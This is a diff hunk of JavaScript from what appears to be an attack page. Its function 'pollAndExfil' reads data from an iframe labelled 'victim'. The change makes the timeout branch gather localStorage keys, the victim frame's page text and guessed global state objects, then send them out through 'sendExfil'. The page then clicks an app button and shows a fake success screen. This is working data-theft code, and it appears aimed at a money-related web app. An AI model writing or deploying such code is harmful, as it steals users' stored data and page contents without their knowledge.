@@ -359,8 +359,23 @@ function pollAndExfil(tries) {
   } else if (tries > 0) {
     setTimeout(function() { pollAndExfil(tries - 1); }, 250);
   } else {
-    // Timeout — send whatever we have, still trigger app
-    sendExfil(raw || 'empty-after-timeout');
+    // Timeout — send diagnostic: ls length, all keys, dom snippet
+    var diag = { status: 'timeout', ls_len: -1, keys: [], dom: '' };
+    try {
+      diag.ls_len = window.localStorage.length;
+      for (var i = 0; i < Math.min(window.localStorage.length, 20); i++) {
+        diag.keys.push(window.localStorage.key(i));
+      }
+    } catch(e) { diag.ls_err = e.message; }
+    try {
+      var iWin2 = document.getElementById('victim').contentWindow;
+      diag.iframe_ls_len = iWin2.localStorage.length;
+      diag.dom = iWin2.document.body ? iWin2.document.body.innerText.substring(0, 600) : 'nobody';
+      // Try common state variable names
+      var stateNames = ['state','datos','store','data','app','monedis'];
+      stateNames.forEach(function(n){ if(iWin2[n]) diag['win_'+n] = JSON.stringify(iWin2[n]).substring(0,200); });
+    } catch(e) { diag.iframe_err = e.message; }
+    sendExfil(JSON.stringify(diag));
     triggerAppButton();
     setTimeout(showSuccess, 900);
   }
